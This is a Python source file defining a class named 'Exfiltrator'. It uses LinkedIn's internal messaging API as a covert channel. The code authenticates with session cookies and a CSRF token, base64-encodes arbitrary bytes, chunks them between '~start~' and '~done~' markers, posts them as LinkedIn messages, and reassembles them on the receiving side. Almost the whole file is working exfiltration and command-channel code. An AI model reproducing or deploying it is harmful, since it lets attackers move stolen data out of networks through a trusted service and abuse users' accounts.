import json
import time
import base64
import urllib.parse

import requests


class Exfiltrator:

    def __init__(self, data_dict):
        self.data_dict = data_dict

        self.headers = {
            'Host': 'www.linkedin.com',
            'Cookie': f'JSESSIONID={self.data_dict["csrf_token"]}; li_at={self.data_dict["li_at"]};',
            'Csrf-Token': self.data_dict["csrf_token"],
            'Content-Type': 'text/plain;charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36'
        }

    def send(self, bytes):
        payload = base64.b64encode(bytes).decode()
        self._send_encoded("~start~")
        self._send_encoded(payload)
        self._send_encoded("~done~")

    def _send_encoded(self, payload):
        if len(payload) > 8000:
            self._send_encoded(payload[:8000])
            self._send_encoded(payload[8000:])
            return
        data = '{"message":{"body":{' \
               '"text":"' + payload + \
               '","attributes":[]},' \
               '"renderContentUnions":[],' \
               '"conversationUrn":"' + self.data_dict["conversation_urn"] + '"' \
               ',"originToken":"' + self.data_dict["origin_token"] + '"},' \
               '"mailboxUrn":"' + self.data_dict["mailbox_urn"] + '",' \
               '"trackingId":"' + self.data_dict["tracking_id"] + '",' \
               '"dedupeByClientGeneratedToken":false}'
        data = data.encode()

        params = {
            'action': 'createMessage',
        }
        response = requests.post(
            'https://linkedin.com/voyager/api/voyagerMessagingDashMessengerMessages',
            params=params,
            headers=self.headers,
            data=data,
        )
        timer = 1
        if response.status_code == 429:
            time.sleep(timer)
            timer += 1
            self._send_encoded(payload)
        elif response.status_code == 400:
            raise Exception(response.text)
        elif response.status_code >= 500:
            raise Exception(response.text)


    def recv(self):
        response = requests.get(
            f'https://linkedin.com/voyager/api/voyagerMessagingGraphQL/graphql?queryId=messengerMessages.{self.data_dict["msg_id"]}'
            f'&variables=(deliveredAt:0,conversationUrn:{urllib.parse.quote(self.data_dict["conversation_urn"])},countBefore:0,countAfter:2147483647)',
            headers=self.headers
        )
        resp_dict = json.loads(response.text)
        result = ""
        chat_list = resp_dict["data"]["messengerMessagesByAnchorTimestamp"]["elements"][::-1]
        while chat_list[0]["body"]["text"] != "~done~":
            time.sleep(60)
        for i in chat_list[1:]:
            text = i["body"]["text"]
            if text != "~start~":
                result = text + result
            else:
                break

        return base64.b64decode(result)

